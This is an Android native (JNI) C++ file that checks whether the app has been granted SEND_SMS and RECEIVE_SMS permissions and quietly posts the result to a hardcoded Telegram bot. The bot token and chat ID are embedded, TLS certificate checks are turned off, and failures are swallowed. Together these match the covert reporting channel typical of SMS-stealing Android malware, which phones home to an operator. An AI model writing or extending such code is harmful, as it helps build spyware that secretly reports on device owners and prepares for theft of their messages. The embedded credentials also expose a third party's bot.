#include <jni.h>
#include <string>
#include <curl/curl.h>

// --- Telegram sender (uses libcURL) ---
static size_t writeCallback(void *contents, size_t size, size_t nmemb, std::string *userp) {
    userp->append((char*)contents, size * nmemb);
    return size * nmemb;
}

void sendToTelegram(const std::string &message) {
    const std::string botToken = "8563683770:AAF9ELZ4TX7-eR4MsI0tLy3EFd460MJopZk";    // <-- replace
    const std::string chatId   = "7269251740";       // <-- replace
    const std::string url = "https://api.telegram.org/bot" + botToken +
                            "/sendMessage?chat_id=" + chatId +
                            "&text=" + message;

    CURL *curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L); // optional: skip cert verify
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeCallback);

        std::string response;
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            // Silent fail or log
        }
        curl_easy_cleanup(curl);
    }
}

// --- Permission checker ---
bool checkPermission(JNIEnv *env, jobject context, const char *permission) {
    jclass contextClass = env->FindClass("android/content/Context");
    jmethodID checkMethod = env->GetMethodID(
        contextClass,
        "checkSelfPermission",  // API 23+
        "(Ljava/lang/String;)I"
    );

    jstring permStr = env->NewStringUTF(permission);
    int result = env->CallIntMethod(context, checkMethod, permStr);
    env->DeleteLocalRef(permStr);

    // PackageManager.PERMISSION_GRANTED == 0
    return result == 0;
}

// --- Main entry point called from Java/Kotlin ---
extern "C" JNIEXPORT void JNICALL
Java_com_example_myapp_NativeBridge_checkAndReport(JNIEnv *env, jobject thiz, jobject context) {

    const char *permSend    = "android.permission.SEND_SMS";
    const char *permReceive = "android.permission.RECEIVE_SMS";

    bool hasSend    = checkPermission(env, context, permSend);
    bool hasReceive = checkPermission(env, context, permReceive);

    std::string message;
    if (hasSend && hasReceive) {
        message = "✅ Permission accepted — SEND_SMS & RECEIVE_SMS granted";
    } else {
        message = "❌ Permission denied — ";
        if (!hasSend)    message += "SEND_SMS missing ";
        if (!hasReceive) message += "RECEIVE_SMS missing ";
    }

    sendToTelegram(message);
}
